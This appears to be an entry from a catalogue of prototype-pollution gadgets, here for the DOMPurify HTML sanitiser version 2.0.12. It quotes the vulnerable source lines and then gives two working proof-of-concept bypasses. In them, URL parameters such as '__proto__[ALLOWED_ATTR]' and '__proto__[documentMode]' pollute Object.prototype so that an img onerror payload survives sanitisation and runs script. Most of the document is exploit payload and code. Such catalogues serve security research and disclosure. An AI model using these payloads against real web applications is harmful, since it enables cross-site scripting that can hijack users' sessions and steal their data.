## DOMPurify

URL: https://github.com/cure53/DOMPurify/

### Vulnerable code fragment
https://github.com/cure53/DOMPurify/blob/3c610449ecf34da4acb6947c8e08ab1fcb3baea8/dist/purify.js
```js
DOMPurify.isSupported = implementation && typeof implementation.createHTMLDocument !== 'undefined' && document.documentMode !== 9;
...
ALLOWED_TAGS = 'ALLOWED_TAGS' in cfg ? addToSet({}, cfg.ALLOWED_TAGS) : DEFAULT_ALLOWED_TAGS;
```

### PoC

#### ALLOWED_ATTR

```
?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src
```

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js"></script>
<script>
  Object.prototype.ALLOWED_ATTR = ['onerror', 'src']
</script>
<script>
  document.write(DOMPurify.sanitize('<img src onerror=alert(1)>'))
</script>
```

#### documentMode

```
?__proto__[documentMode]=9
```

```html
<script>
  Object.prototype.documentMode = 9
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js"></script>
<script>
  document.write(DOMPurify.sanitize('<img src onerror=alert(1)>'))
</script>
```